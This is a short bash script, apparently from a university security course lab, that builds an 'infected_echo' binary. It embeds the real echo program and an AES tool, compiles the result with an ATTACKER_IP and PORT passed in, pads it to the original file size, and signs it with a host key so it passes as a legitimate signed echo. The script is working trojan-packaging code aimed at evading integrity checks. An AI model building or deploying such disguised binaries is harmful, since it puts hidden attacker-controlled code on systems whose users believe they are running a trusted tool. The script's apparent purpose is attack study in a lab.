#!/bin/bash

HOME="/home/csc2025/110550010-110550101"

if [ ! -f "$HOME/echo" ]; then
	cp /usr/bin/echo $HOME/echo
fi
gzip -c echo > echo.gz
xxd -i echo.gz > echo_gz.h
xxd -i /app/banner > banner.h
cp /app/aes-tool.c $HOME
make ATTACKER_IP=\"$1\" PORT=\"$2\"
truncate -s $((35208 - 512)) infected_echo
openssl dgst -sha3-512 -sign /app/certs/host.key -out sig infected_echo
tail -c 512 sig >> infected_echo
chmod +x infected_echo
rm echo

